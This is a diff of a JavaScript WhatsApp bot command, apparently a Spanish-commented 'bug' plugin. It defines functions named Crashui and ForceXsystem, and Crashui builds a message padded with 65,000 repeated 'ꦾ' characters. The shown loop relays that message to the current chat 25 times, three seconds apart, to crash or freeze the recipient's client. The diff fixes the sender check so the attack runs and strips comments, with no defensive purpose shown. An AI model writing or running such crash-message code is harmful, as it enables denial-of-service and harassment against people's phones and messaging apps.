@@ -2,14 +2,13 @@ let handler = async (m, { conn }) => {
   const botJid = conn.user?.id || conn.user?.jid;
   const target = m.chat;
 
-  // Solo el bot puede usar este comando
-  if (m.sender !== botJid) {
+  // Solo el bot puede usar este comando (corregido)
+  if (m.sender.replace(/[^0-9]/g, '') !== botJid.replace(/[^0-9]/g, '')) {
     return m.reply("⚠️ Solo el bot puede usar este comando.");
   }
 
   const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 
-  // Función Crashui
   async function Crashui(target) {
     let Crash = "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(65000);
     await conn.relayMessage(
@@ -38,7 +37,6 @@ let handler = async (m, { conn }) => {
     );
   }
 
-  // Función ForceXsystem
   async function ForceXsystem(kirana, target) {
     let message = {
       viewOnceMessage: {
@@ -85,7 +83,6 @@ let handler = async (m, { conn }) => {
     });
   }
 
-  // Secuencia de 100 mensajes en 5 min
   for (let i = 0; i < 25; i++) {
     await Crashui(target);
     await delay(3000);
